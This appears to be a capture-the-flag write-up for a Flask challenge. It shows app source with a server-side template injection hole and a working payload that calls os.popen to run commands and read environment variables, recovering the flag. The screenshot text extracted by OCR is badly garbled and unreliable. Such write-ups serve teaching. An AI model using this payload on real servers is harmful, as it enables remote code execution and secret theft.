# Username Decorator
> My favorite social media platform, Prorope, has overhauled their username system and now supports prefixes and suffixes! Isn't that so cool?

> For one, I know that I would really love to be the !! JW !!, so I made a website to preview these username changes.

> Note: the flag is in an environment variable called FLAG

## About the Challenge
We were given a source code that contain 2 python code, here is the content of `app.py` file

```python
from flask import Flask, render_template_string, request
import re

app = Flask(__name__)
app.config['FLAG_LOCATION'] = 'os.getenv("FLAG")'

def validate_username(username):
  return bool(re.fullmatch("[a-zA-Z0-9._\[\]\(\)\-=,]{2,}", username))

@app.route('/', methods=['GET', 'POST'])
def index():
    prefix = ''
    username = ''
    suffix = ''
    
    if request.method == 'POST':
      prefix = (request.form['prefix'] or '')[:2]
      username = request.form['username'] or ''
      suffix = (request.form['suffix'] or '')[:2]
      if not validate_username(username): username = 'Invalid Username'
	
    template = '<!DOCTYPE html><html><body>\
    <form action="" method="post">\
      Prefix: <input name="prefix"> <br>\
      Username: <input name="username"> <br>\
      Suffix: <input name="suffix"> <br> \
      <input type="submit" value="Preview!">\
    </form><h2>%s %s %s</h2></body></html>' % (prefix, username, suffix)
    return render_template_string(template)

@app.route('/flag')
def get_flag():
  return 'Nein'
  import os
  return eval(app.config['FLAG_LOCATION'])
```

And here is the preview of the website


[Image extracted text: Prefix:
Username:
Suffix:
Previewl]


## How to Solve?
The website is vulnerable to SSTI (Server Side Template Injection). To exploit the website we need to input `{{` in the `Prefix` form and `}}` in the `Suffix` form. For example im gonna check using `{{config}}` to see if the website is vulnerable to SSTI or not


[Image extracted text: Prefix:
Username:
Suffix:
Previewl
<Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None; 'SECRET_KEY': None,
'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days-31), 'USE_X_SENDFILE': False,
SERVER NAME': None,
APPLICATION_ROOT': '/ , 'SESSION_COOKIE_NAME': 'session' , 'SESSION_COOKIE_DOMAIN': None,
SESSIONCOOKIE_PATH' :
None,
SESSION
COOKIE_HTTPONLY' : True,
SESSION_COOKIE_SECURE
False, 'SESSION_
COOKIE_SAMESITE' : None,
SESSION
REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH: None, 'SEND_FILE_MAX
AGE_DEFAULT': None,
TRAP_BAD_REQUEST_ERRORS' :
None,
TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False,
'PREFERRED
URL
SCHEME': 'http'
TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE' =
4093, 'FLAG_LOCATION':
'os-getenv("FLAG")}>]


So, to escalate the impact of SSTI, im using this payload to do Remote Code Execution

```
url_for.__globals__.os.__dict__.popen(request.args.file).read()
```

And then add new parameter called `file` in the request that contain unix command


[Image extracted text: POST
/2 filesent
HTTP/1.1
HTTP / 1
200
Host :
198,
199
90-158:37850
Server
cnicorn
User-Agent
Hozilla/5
(Vindous
IT
10 _
Vin64;
*64;
rv:109
Dace
Sat
Jun
2023
13: 39:17
GHT
Gecko/ZO1OO1ol
Firefor/113
Connect
on:
close
Aecept
Concent-
Type
cere/htil;
charsetsucf-8
cert /htul
application/ xhtnltxul, application/xul;q-0.9
image/ avif,
Content-
Lencth:
879
inage /uebp
f"
{4F0
Lccept-Language
en-US
en ; 4-0
!DOCTIPE
hcal<htnl>
Aecept
Encoding:
gzip
deflace
<bodyz
Content
Type-
applicat
on / *
IV-for-urlencoded
form
action=
method-"Post
Content-Lengch:
108
Prefix:
<input
nane
prefix
Origin:
http: / /198
199
90_
1583 37850
<br>
Connect
close
Usernae
<inpuc
nane
usernande
Referer:
http
1/198
199
90-158:37850/
<br>
Upgrade
Ins
cure
Sts:
Suffix:
<input
neln =
suffix
<br>
prefix=
7Bt ZBfusernane=
<input
type=
subhit
Falue
Previeri " >
ur 1
for
globals
05 .
dict
Popent
~Brequest
args-
file -9
read
28429Esuffix=t7D$ 7D|
</ form>
<h_>
HOSTNAHE-=84421f112f17
PTTHCH
PIP
VERSION-_3-
3.1
10
HOHE= /nonexiscent
11
GPG_KEY-1035CBCI9EISBABEIECEAB6BE4E6-8FBD684696D
PTTHON
GET
PIP_UPL-hctps: / /gichub
con/pypa/ get-pip/rav/0d85
70dc44796f43696652222cf176b3db6ac70e/public/get-pip
PY
SERVER_SOFTWARE-gunicorn/20
PLTH- /usr
local/bin: /uS
local/sbin: /usr
local/bin: /usr / sbi
n: /usr /bin: /sbin: /bin
15
LAIG-C
UTF-8
16
PTTHON
VERSION- 3
11 -
17
PTTHON_
SETUPTOOLS
VERSION-6 5
18
JAIL
EITV
FLAG-ctf(jist_
uS:
_pr Op 31,
E 31p14Ing_411 34dy}
19
PUD= /var /=u/ chall
PTTHON_GET
PIP
SHA 2 56-96461deced522a487dde65207ec5a9cffeca0
d34e7af7ealafc470ff04746207
FLAG-ctf{jist
4s3_prOp31_
31pl4 Ing_41r34dy}
</h->
~[body>
que]


```
ctf{j4st_us3_pr0p3r_t3mp14t1ng_4lr34dy}
```